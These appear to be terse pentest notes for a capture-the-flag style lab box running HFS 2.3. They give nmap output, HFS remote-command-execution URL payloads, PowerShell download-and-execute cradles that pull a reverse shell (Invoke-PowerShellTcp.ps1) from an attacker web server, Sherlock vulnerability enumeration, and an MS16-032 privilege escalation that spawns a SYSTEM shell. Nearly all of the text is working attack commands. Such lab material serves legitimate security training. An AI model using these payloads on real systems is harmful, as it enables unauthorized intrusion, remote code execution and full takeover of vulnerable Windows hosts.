nmap -p80 -sV -sC -Pn -T4 -oA 10.10.10.8 10.10.10.8
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-23 01:02 EDT
Nmap scan report for 10.10.10.8
Host is up (0.045s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows




#for using script
python3 49125.py 10.10.10.8 80 "c:\windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.22:8000/Invoke-PowerShellTcp.ps1')"


#put on url also can
http://10.10.10.8/?search=%00{.+exec|powershell.exe+/c+ping+-n+1+10.10.14.22.}

#adjust accordingly
http://10.10.10.8/?search=%00{.exec|C%3a\Windows\System32\WindowsPowerShell\v1.0\powershell.exe+IEX(New-Object+Net.WebClient).downloadString('http%3a//10.10.14.22:8000/Invoke-PowerShellTcp.ps1').}



grep -i function Sherlock.ps1               
function Get-FileVersionInfo ($FilePath) {
function Get-InstalledSoftware($SoftwareName) {
function Get-Architecture {
function Get-CPUCoreCount {
function New-ExploitTable {
function Set-ExploitTable ($MSBulletin, $VulnStatus) {
function Get-Results {
function Find-AllVulns {
function Find-MS10015 {
function Find-MS10092 {
function Find-MS13053 {
function Find-MS13081 {
function Find-MS14058 {
function Find-MS15051 {
function Find-MS15078 {
function Find-MS16016 {
function Find-MS16032 {
function Find-MS16034 {
function Find-CVE20177199 {
function Find-MS16135 {



    __________
#Download from attacker webserver
IEX(New-Object Net.Webclient).downloadString('http://10.10.14.22:8000/Sherlock.ps1')


Title      : Secondary Logon Handle
MSBulletin : MS16-032
CVEID      : 2016-0099
Link       : https://www.exploit-db.com/exploits/39719/
VulnStatus : Appears Vulnerable

Title      : Windows Kernel-Mode Drivers EoP
MSBulletin : MS16-034
CVEID      : 2016-0093/94/95/96
Link       : https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS1
             6-034?
VulnStatus : Appears Vulnerable

Title      : Win32k Elevation of Privilege
MSBulletin : MS16-135
CVEID      : 2016-7255
Link       : https://github.com/FuzzySecurity/PSKernel-Primitives/tree/master/S
             ample-Exploits/MS16-135
VulnStatus : Appears Vulnerable
___________
                        

“Appears Vulnerable”, MS16-032, MS16-034, and MS16-135.

IEX(New-Object Net.Webclient).downloadString('http://10.10.14.22:8000/exploit.ps1')


Privilege Escalation
0. Put this command at the bottom of the MS16032 exploit
Invoke-MS16032 -Command "iex(New-Object Net.WebClient).DownloadString('http://10.10.14.22:8000/Invoke-PowerShellTcp.ps1')"

1. In current low privilege shell, download ms16-032 exploit then it will execute as system authority to invoke another shell with root access 
IEX(New-Object Net.WebClient).downloadstring('http://10.10.14.22:8000/Invoke-MS16032.ps1')


2 netcat listeners needed